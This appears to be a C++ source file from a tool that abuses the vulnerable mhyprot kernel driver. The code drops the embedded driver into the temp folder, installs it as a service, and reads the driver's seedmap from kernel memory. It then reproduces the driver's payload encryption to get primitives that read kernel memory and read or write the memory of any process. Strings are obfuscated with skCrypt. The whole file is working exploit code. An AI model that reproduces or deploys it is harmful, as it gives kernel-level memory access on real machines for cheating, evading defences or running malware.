/*
 * MIT License
 *
 * Copyright (c) 2020 Kento Oki
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include "mhyprot.hpp"
#include "../skCrypter.h"

//
// initialization of its service and device
//
bool mhyprot::init()
{
	logger::log2(skCrypt("[>] loading vulnerable driver...\n"));

	char temp_path[MAX_PATH];

	if (const uint32_t length = GetTempPath(sizeof(temp_path), temp_path); length > MAX_PATH || !length)
	{
		logger::log2(skCrypt("[!] failed to obtain temp path. (0x%lX)\n"), GetLastError());
		return false;
	}

	//
	// place the driver binary into the temp path
	//
	const std::string placement_path = std::string(temp_path) + MHYPROT_SYSFILE_NAME;

	if (std::filesystem::exists(placement_path))
	{
		std::remove(placement_path.c_str());
	}

	//
	// create driver sys from memory
	//
	if (!file_utils::create_file_from_buffer(
		placement_path,
		(void*)resource::raw_driver,
		sizeof(resource::raw_driver)
	))
	{
		logger::log2(skCrypt("[!] failed to prepare %s. (0x%lX)\n"), MHYPROT_SYSFILE_NAME, GetLastError());
		return false;
	}

	logger::log2(skCrypt("[>] preparing service...\n"));

	//
	// create service using winapi, this needs administrator privileage
	//
	detail::mhyplot_service_handle = service_utils::create_service(placement_path);

	if (!CHECK_HANDLE(detail::mhyplot_service_handle))
	{
		logger::log2(skCrypt("[!] failed to create service. (0x%lX)\n"), GetLastError());
		return false;
	}

	//
	// start the service
	//
	if (!service_utils::start_service(detail::mhyplot_service_handle))
	{
		logger::log2(skCrypt("[!] failed to start service. (0x%lX)\n"), GetLastError());
		return false;
	}

	logger::log2(skCrypt("[<] %s prepared\n"), MHYPROT_SYSFILE_NAME);

	//
	// open the handle of its driver device
	//
	detail::device_handle = CreateFile(
		TEXT(MHYPROT_DEVICE_NAME),
		GENERIC_READ | GENERIC_WRITE,
		0,
		nullptr,
		OPEN_EXISTING,
		NULL,
		nullptr
	);

	if (!CHECK_HANDLE(detail::device_handle))
	{
		logger::log2(skCrypt("[!] failed to obtain device handle (0x%lX)\n"), GetLastError());
		return false;
	}

	logger::log2(skCrypt("[+] device handle snatched (0x%llX)\n"), detail::device_handle);

	logger::log2(skCrypt("[>] mhyprot initialized successfully\n"));

	return true;
}

void mhyprot::unload()
{
	if (detail::device_handle)
	{
		CloseHandle(detail::device_handle);
	}

	if (detail::mhyplot_service_handle)
	{
		service_utils::stop_service(detail::mhyplot_service_handle);
		service_utils::delete_service(detail::mhyplot_service_handle);
	}
}


bool mhyprot::driver_impl::request_ioctl(const DWORD ioctl_code, const LPVOID in_buffer, const DWORD in_buffer_size)
{
	//
	// allocate memory for this command result
	//
	const LPVOID out_buffer = calloc(1, in_buffer_size);
	DWORD out_buffer_size;

	if (!out_buffer)
	{
		return false;
	}

	//
	// send the ioctl request
	//
	const bool result = DeviceIoControl(
		mhyprot::detail::device_handle,
		ioctl_code,
		in_buffer,
		in_buffer_size,
		out_buffer,
		in_buffer_size,
		&out_buffer_size,
		nullptr
	);

	//
	// store the result
	//
	if (out_buffer_size)
	{
		memcpy(in_buffer, out_buffer, out_buffer_size);
	}


		free(out_buffer);


	return result;
}

//
// initialize driver implementations with payload encryption requirements
//
bool mhyprot::driver_impl::driver_init(const bool debug_prints, const bool print_seeds)
{
	logger::log2(skCrypt("[>] initializing driver...\n"));

	//
	// the driver initializer
	//
	MHYPROT_INITIALIZE initializer;
	initializer._m_002 = 0x0BAEBAEEC;
	initializer._m_003 = 0x0EBBAAEF4FFF89042;

	if (!request_ioctl(MHYPROT_IOCTL_INITIALIZE, &initializer, sizeof(initializer)))
	{
		logger::log2(skCrypt("[!] failed to initialize mhyplot driver implementation\n"));
		return false;
	}

	//
	// driver's base address in the system
	//
	const uint64_t mhyprot_address = win_utils::
		obtain_sysmodule_address(MHYPROT_SYSFILE_NAME, debug_prints);

	if (!mhyprot_address)
	{
		logger::log2(skCrypt("[!] failed to locate mhyprot module address. (0x%lX)\n"), GetLastError());
		return false;
	}

	logger::log2(skCrypt("[+] %s is @ 0x%llX\n"), MHYPROT_SYSFILE_NAME, mhyprot_address);

	//
	// read the pointer that points to the seedmap that used to encrypt payloads
	// the pointer on the [driver.sys + 0xA0E8]
	//
	const auto seedmap_address = driver_impl::
		read_kernel_memory<uint64_t>(mhyprot_address + MHYPROT_OFFSET_SEEDMAP);

	logger::log2(skCrypt("[+] seedmap in kernel [0x%llX + 0x%lX] @ (seedmap)0x%llX\n"),
	             mhyprot_address, MHYPROT_OFFSET_SEEDMAP, seedmap_address);

	if (!seedmap_address)
	{
		logger::log2(skCrypt("[!] failed to locate seedmap in kernel\n"));
		return false;
	}

	//
	// read the entire seedmap as size of 0x9C0
	//
	if (!driver_impl::read_kernel_memory(
		seedmap_address,
		&detail::seedmap,
		sizeof(detail::seedmap)
	))
	{
		logger::log2(skCrypt("[!] failed to pickup seedmap from kernel\n"));
		return false;
	}

	for (int i = 0; i < (sizeof(detail::seedmap) / sizeof(detail::seedmap[0])); i++)
	{
		if (print_seeds)
			logger::log2(skCrypt("[+] seedmap (%05d): 0x%llX\n"), i, detail::seedmap[i]);
	}

	logger::log2(skCrypt("[<] driver initialized successfully.\n"));

	return true;
}

//
// generate a key for the payload
//
uint64_t mhyprot::driver_impl::generate_key(const uint64_t seed)
{
	uint64_t k = ((((seed >> 29) & 0x555555555 ^ seed) & 0x38EB3FFFF6D3) << 17) ^ (seed >> 29) & 0x555555555 ^ seed;
	return ((k & 0xFFFFFFFFFFFFBF77u) << 37) ^ k ^ ((((k & 0xFFFFFFFFFFFFBF77u) << 37) ^ k) >> 43);
}

//
// encrypt the payload
//
void mhyprot::driver_impl::encrypt_payload(void* payload, const size_t size)
{
	if (size % 8)
	{
		logger::log2(skCrypt("[!] (payload) size must be 8-byte alignment"));
		return;
	}

	if (size / 8 >= 312)
	{
		logger::log2(skCrypt("[!] (payload) size must be < 0x9C0"));
		return;
	}

	const auto p_payload = static_cast<uint64_t*>(payload);
	DWORD64 key_to_base = 0;

	for (DWORD i = 1; i < size / 8; i++)
	{
		const uint64_t key = driver_impl::generate_key(detail::seedmap[i - 1]);
		p_payload[i] = p_payload[i] ^ key ^ (key_to_base + p_payload[0]);
		key_to_base += 0x10;
	}
}

//
// read memory from the kernel using vulnerable ioctl
//
bool mhyprot::driver_impl::read_kernel_memory(const uint64_t address, void* buffer, const size_t size)
{
	if (!buffer)
	{
		return false;
	}

	const DWORD payload_size = size + sizeof(DWORD);
	const auto payload = static_cast<PMHYPROT_KERNEL_READ_REQUEST>(calloc(1, payload_size));

	if (!payload)
	{
		return false;
	}

	payload->header.address = address;
	payload->size = size;

	if (!request_ioctl(MHYPROT_IOCTL_READ_KERNEL_MEMORY, payload, payload_size))
	{
		return false;
	}

	if (!payload->header.result)
	{
		memcpy(buffer, reinterpret_cast<PUCHAR>(payload) + 4, size);
		return true;
	}

	return false;
}

//
// read specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::read_user_memory(
	const uint32_t process_id, const uint64_t address, void* buffer, const size_t size)
{
	MHYPROT_USER_READ_WRITE_REQUEST payload;
	payload.action = MHYPROT_ACTION_READ; // action code
	payload.process_id = process_id; // target process id
	payload.address = address; // address
	payload.buffer = (uint64_t)buffer; // our buffer
	payload.size = size; // size

	encrypt_payload(&payload, sizeof(payload));

	return request_ioctl(
		MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
		&payload,
		sizeof(payload)
	);
}

//
// write specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::write_user_memory(
	const uint32_t process_id, const uint64_t address, void* buffer,const size_t size)
{
	MHYPROT_USER_READ_WRITE_REQUEST payload;
	payload.action = MHYPROT_ACTION_WRITE; // action code
	payload.process_id = process_id; // target process id
	payload.address = (uint64_t)buffer; // our buffer
	payload.buffer = address; // destination
	payload.size = size; // size

	encrypt_payload(&payload, sizeof(payload));

	return request_ioctl(
		MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
		&payload,
		sizeof(payload)
	);
}
